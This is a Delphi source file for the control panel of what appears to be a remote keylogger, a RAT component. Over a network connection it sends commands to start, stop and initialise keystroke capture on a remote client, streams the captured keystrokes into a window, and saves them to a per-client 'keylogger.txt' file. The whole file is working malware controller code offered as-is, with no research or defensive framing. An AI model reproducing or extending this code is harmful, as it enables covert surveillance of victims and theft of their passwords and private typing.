unit UnitKeylogger;

interface

uses
  Winapi.Windows, Winapi.Messages, Winapi.Winsock2,
  System.SysUtils, System.Variants, System.Classes, System.JSON,
  System.Generics.Collections, System.IOUtils,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls,
  Vcl.ComCtrls, Vcl.StdCtrls, ncLines;

type
  TSendJSONCallback = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterCallback = procedure(aLine: TncLine) of object;

  TForm7 = class(TForm)
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    Memo1: TMemo;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FClientLine: TncLine;
    FChannelLine: TncLine;
    FClientID: string;
    FIsCapturing: Boolean;
    FOnSendJSON: TSendJSONCallback;
    FOnUnregister: TUnregisterCallback;
    function GetActiveLine: TncLine;
    procedure SetCapturing(Value: Boolean);
  public
    procedure SetChannelLine(aChanLine: TncLine);
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      SendJSONCB: TSendJSONCallback; UnregisterCB: TUnregisterCallback);
    procedure HandleKeyloggerJSON(JSONObj: TJSONObject);
    procedure DetachCallbacks;
    procedure RequestInit;
  end;

var
  Form7: TForm7;

implementation

{$R *.dfm}

function TForm7.GetActiveLine: TncLine;
begin
  if Assigned(FChannelLine) then
    Result := FChannelLine
  else
    Result := FClientLine;
end;

procedure TForm7.SetChannelLine(aChanLine: TncLine);
begin
  FChannelLine := aChanLine;
end;

procedure TForm7.SetupForClient(aLine: TncLine; const ClientID: string;
  SendJSONCB: TSendJSONCallback; UnregisterCB: TUnregisterCallback);
begin
  FClientLine := aLine;
  FChannelLine := nil;
  FClientID := ClientID;
  FOnSendJSON := SendJSONCB;
  FOnUnregister := UnregisterCB;
  Caption := 'Keylogger - ' + ClientID;
  OnClose := FormClose; // Ensure event is linked
  if Assigned(Memo1) then
    Memo1.Clear;
  FIsCapturing := False; // Reset internal state
  SetCapturing(False);   // Update UI
end;

procedure TForm7.SetCapturing(Value: Boolean);
begin
  FIsCapturing := Value;
  if FIsCapturing then
  begin
    Button1.Caption := 'Stop Capturing';
    StatusBar1.Panels[0].Text := 'Status [on]';
  end
  else
  begin
    Button1.Caption := 'Start Capturing';
    StatusBar1.Panels[0].Text := 'Status [off]';
  end;
end;

procedure TForm7.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  TargetLine: TncLine;
begin
  TargetLine := GetActiveLine;
  if not Assigned(TargetLine) or not Assigned(FOnSendJSON) then Exit;

  JSONObj := TJSONObject.Create;
  try
    if not FIsCapturing then
      JSONObj.AddPair('action', 'keylogstart')
    else
      JSONObj.AddPair('action', 'keylogstop');

    FOnSendJSON(TargetLine, JSONObj);
    SetCapturing(not FIsCapturing);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm7.Button2Click(Sender: TObject);
var
  DirPath, FilePath: string;
  SafeID: string;
begin
  if FClientID = '' then Exit;

  // Sanitize ClientID for path
  SafeID := FClientID;
  SafeID := SafeID.Replace('\', '_').Replace('/', '_').Replace(':', '_')
                  .Replace('*', '_').Replace('?', '_').Replace('"', '_')
                  .Replace('<', '_').Replace('>', '_').Replace('|', '_');

  DirPath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
  DirPath := TPath.Combine(DirPath, SafeID);

  try
    if not TDirectory.Exists(DirPath) then
      TDirectory.CreateDirectory(DirPath);

    FilePath := TPath.Combine(DirPath, 'keylogger.txt');
    Memo1.Lines.SaveToFile(FilePath);

    StatusBar1.Panels[0].Text := 'Saved to: ' + FilePath;
  except
    on E: Exception do
      ShowMessage('Error saving file: ' + E.Message);
  end;
end;

procedure TForm7.HandleKeyloggerJSON(JSONObj: TJSONObject);
var
  LogValue: string;
begin
  if not Assigned(JSONObj) or (csDestroying in ComponentState) or not Assigned(Memo1) then Exit;

  if JSONObj.Values['log'] <> nil then
  begin
    LogValue := JSONObj.Values['log'].Value;

    Memo1.Lines.BeginUpdate;
    try
      Memo1.SelStart := Memo1.GetTextLen;
      Memo1.SelLength := 0;
      Memo1.SelText := LogValue;
    finally
      Memo1.Lines.EndUpdate;
    end;

    // Auto scroll to bottom
    SendMessage(Memo1.Handle, WM_VSCROLL, SB_BOTTOM, 0);
  end;
end;

procedure TForm7.FormClose(Sender: TObject; var Action: TCloseAction);
var
  JSONObj: TJSONObject;
  TargetLine: TncLine;
begin
  TargetLine := GetActiveLine;
  if FIsCapturing and Assigned(TargetLine) and Assigned(FOnSendJSON) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'keylogstop');
      FOnSendJSON(TargetLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;

  if Assigned(FChannelLine) then
  begin
    try
      Winapi.Winsock2.closesocket(FChannelLine.Handle);
    except
    end;
    FChannelLine := nil;
  end;

  if Assigned(FOnUnregister) and Assigned(FClientLine) then
    FOnUnregister(FClientLine);

  DetachCallbacks;
  Action := caFree;
end;

procedure TForm7.DetachCallbacks;
begin
  FClientLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
  StatusBar1.Panels[0].Text := 'Status [Disconnected]';
end;

procedure TForm7.RequestInit;
var
  JSONObj: TJSONObject;
  TargetLine: TncLine;
begin
  TargetLine := GetActiveLine;
  if not Assigned(TargetLine) or not Assigned(FOnSendJSON) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'keyloginit');
    FOnSendJSON(TargetLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

end.
